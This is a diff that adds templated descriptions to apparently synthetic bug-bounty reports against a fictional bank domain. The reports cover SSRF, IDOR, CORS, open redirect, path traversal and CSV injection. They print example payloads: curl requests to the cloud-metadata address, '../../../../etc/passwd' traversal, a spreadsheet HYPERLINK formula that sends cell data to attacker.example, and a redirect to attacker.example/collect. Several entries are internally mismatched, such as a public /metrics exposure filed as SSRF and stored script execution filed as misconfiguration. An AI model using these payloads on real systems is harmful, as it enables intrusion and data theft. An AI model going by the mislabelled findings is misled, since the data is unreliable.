+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6021,7 +6065,8 @@
           "offset": "5d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6142,7 +6187,8 @@
           "offset": "5d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6286,7 +6332,8 @@
           "offset": "2d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6418,7 +6465,8 @@
           "offset": "5d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6511,7 +6559,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6691,7 +6740,8 @@
           "offset": "5d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6829,7 +6879,8 @@
           "offset": "8d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6988,7 +7039,8 @@
           "offset": "5d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7144,7 +7196,8 @@
           "offset": "4d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7246,7 +7299,8 @@
           "offset": "5d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7329,7 +7383,8 @@
           "offset": "15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7456,7 +7511,8 @@
           "offset": "4d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7570,7 +7626,8 @@
           "offset": "2d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7706,7 +7763,8 @@
           "offset": "2d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7861,7 +7919,8 @@
           "offset": "2d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7957,7 +8016,8 @@
           "offset": "2d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8101,7 +8161,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8187,7 +8248,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8351,7 +8413,8 @@
           "offset": "6d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8503,7 +8566,8 @@
           "offset": "6d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8615,7 +8679,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8740,7 +8805,8 @@
           "offset": "4d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8892,7 +8958,8 @@
           "offset": "1d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9038,7 +9105,8 @@
           "offset": "6d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9178,7 +9246,8 @@
           "offset": "3d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://mobile.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9370,7 +9439,8 @@
           "offset": "4d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://mobile.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9490,7 +9560,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://mobile.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9589,7 +9660,8 @@
           "offset": "2d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://mobile.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9692,7 +9764,8 @@
           "offset": "20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://mobile.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9797,7 +9870,8 @@
           "offset": "1d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9900,7 +9974,8 @@
           "offset": "3d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
